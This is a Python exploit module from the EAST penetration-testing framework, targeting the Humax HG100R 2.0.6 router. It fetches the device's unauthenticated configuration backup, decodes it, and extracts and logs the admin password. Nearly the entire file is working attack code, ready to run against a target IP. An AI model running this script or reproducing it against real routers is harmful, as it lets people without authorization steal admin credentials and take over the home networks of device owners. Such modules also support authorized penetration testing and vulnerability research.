#! /usr/bin/env python
# -*- coding: utf_8 -*-
# The exploit is a part of EAST Framework - use only under the license agreement specified in LICENSE.txt in your EAST Framework distribution

import sys
import urllib2
import base64
import struct

sys.path.append("./core")
from Sploit import Sploit

INFO = {}
INFO['NAME'] = "efa_humax_hg100r_cd"
INFO['DESCRIPTION'] = "Humax HG100R 2.0.6 - Backup File Download"
INFO['VENDOR'] = "http://humaxdigital.com"
INFO['DOWNLOAD_LINK'] = ''
INFO['LINKS'] = ['https://www.exploit-db.com/exploits/42284/']
INFO["CVE Name"] = ""
INFO["NOTES"] = """Humax HG100R backup file download"""

INFO['CHANGELOG'] = "03 Jul, 2017. Written by Gleg team."
INFO['PATH'] = 'Exploits/Hardware/'

# Must be in every module, to be set by framework
OPTIONS = {}
OPTIONS["HOST"] = "127.0.0.1", dict(description = 'Target IP')
OPTIONS["PORT"] = 80, dict(description = 'Target port')
#OPTIONS["COMMAND"] = '', dict(description = 'Command')

class exploit(Sploit):
    def __init__(self, host="", port=0, logger=None):
        Sploit.__init__(self, logger = logger)
        self.name = INFO['NAME']
        self.port = port
        self.host = host
#        self.command = ""
    
    def args(self):
        self.args = Sploit.args(self, OPTIONS)
        self.host = self.args.get('HOST', self.host)
        self.port = int(self.args.get('PORT', self.port))
#        self.command = self.args.get('COMMAND', self.command)
        
    
    def make_url(self, path = ''):
        return 'http://{}:{}{}'.format(self.host, self.port, path)
        
    def run(self):
        self.args()
        
        url = self.make_url('/view/basic/GatewaySettings.bin')
        try:
            fd = urllib2.urlopen(url)
            content = fd.read()
        except Exception as e:
            self.log(e)
            self.finish(False)
            
        result = base64.b64decode(content[96:]).decode('ascii','ignore').replace('^@','')
        second = result.split('admin')[1]
        lpass = int(struct.unpack('>h', second[:2])[0])
        
        self.log('Found credentials: admin:' + second[2:lpass + 2])
        self.log('Config file saved to OUTPUT directory')
        self.writefile(result)
        
        self.finish(True)

if __name__ == '__main__':
    """
        By now we only have the tool mode for exploit..
        Later we would have standalone mode also.
    """
    print "Running exploit %s .. " % INFO['NAME']
    e = exploit("192.168.0.1", 80)
    e.run()

